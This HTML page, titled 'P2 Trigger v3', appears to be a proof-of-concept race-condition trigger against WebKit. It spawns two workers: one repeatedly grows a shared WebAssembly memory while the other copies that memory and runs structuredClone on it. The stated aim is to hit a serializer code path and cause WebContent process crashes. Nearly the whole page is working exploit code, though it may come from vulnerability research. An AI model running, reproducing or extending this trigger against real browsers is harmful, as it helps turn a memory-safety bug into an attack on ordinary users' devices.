<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>P2 Trigger v3</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:12px; margin:0; padding:8px; }
#log { white-space:pre-wrap; word-break:break-all; }
</style>
</head>
<body>
<div id="log">P2 v3 loading...</div>
<script>
(function(){
"use strict";

var LOG = document.getElementById('log');
var t0 = Date.now();
var resetCount = 0;

function log(msg) {
  var line = '[' + ((Date.now()-t0)/1000).toFixed(3) + 's] ' + msg;
  LOG.textContent += '\n' + line;
}

document.addEventListener('visibilitychange', function() {
  if(document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
});

// Grow worker: hammers mem.grow(), resets when hitting max
var growSrc = [
  'onmessage = function(e) {',
  '  var mem = e.data;',
  '  var n = 0;',
  '  postMessage({type:"spawn", msg:"grow worker alive"});',
  '  function grow() {',
  '    try {',
  '      mem.grow(1);',
  '      n++;',
  '      if(n % 100 === 0) postMessage({type:"grow", n:n});',
  '    } catch(err) {',
  '      postMessage({type:"reset", msg:"grow hit max"});',
  '      return;',
  '    }',
  '    setTimeout(grow, 0);',
  '  }',
  '  grow();',
  '};'
].join('\n');

// Clone worker: copies slice to regular ArrayBuffer, then structuredClone with transfer
// This hits the same serializer code path without transferring shared memory
var cloneSrc = [
  'onmessage = function(e) {',
  '  var mem = e.data;',
  '  var n = 0;',
  '  postMessage({type:"spawn", msg:"clone worker alive"});',
  '  function clone() {',
  '    try {',
  '      var ab = mem.buffer;',
  '      var ta = new Uint8Array(ab);',
  '      // Copy to regular ArrayBuffer — transferable, hits serializer',
  '      var copy = new ArrayBuffer(65536);',
  '      new Uint8Array(copy).set(ta.subarray(0, 65536));',
  '      structuredClone(new Uint8Array(copy), {transfer: [copy]});',
  '      n++;',
  '      if(n % 10 === 0) postMessage({type:"clone", n:n});',
  '    } catch(err) {',
  '      postMessage({type:"cloneerr", msg:err.message});',
  '    }',
  '    setTimeout(clone, 0);',
  '  }',
  '  clone();',
  '};'
].join('\n');

var growBlob = new Blob([growSrc], {type:'application/javascript'});
var cloneBlob = new Blob([cloneSrc], {type:'application/javascript'});
var growURL = URL.createObjectURL(growBlob);
var cloneURL = URL.createObjectURL(cloneBlob);

var SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
var growWorker = null;
var cloneWorker = null;

function spawnWorkers() {
  growWorker = new Worker(growURL);
  cloneWorker = new Worker(cloneURL);

  growWorker.onmessage = function(e) {
    if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
    if(e.data.type === 'grow') log('grow n=' + e.data.n);
    if(e.data.type === 'reset') {
      resetCount++;
      log('RESET #' + resetCount + ': ' + e.data.msg);
      // Respawn with fresh memory
      growWorker.terminate();
      cloneWorker.terminate();
      SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
      spawnWorkers();
    }
  };

  cloneWorker.onmessage = function(e) {
    if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
    if(e.data.type === 'clone') log('clone n=' + e.data.n);
    if(e.data.type === 'cloneerr') log('CLONE ERROR: ' + e.data.msg);
  };

  growWorker.postMessage(SHARED_MEM);
  cloneWorker.postMessage(SHARED_MEM);
}

log('P2 v3: spawning workers...');
spawnWorkers();

log('P2 v3: workers spawned, waiting for race...');

setTimeout(function() {
  log('P2 v3: 30s elapsed, resets=' + resetCount);
  log('P2 v3: check Analytics for WebKit.WebContent crash logs');
}, 30000);

})();
</script>
</body>
</html>
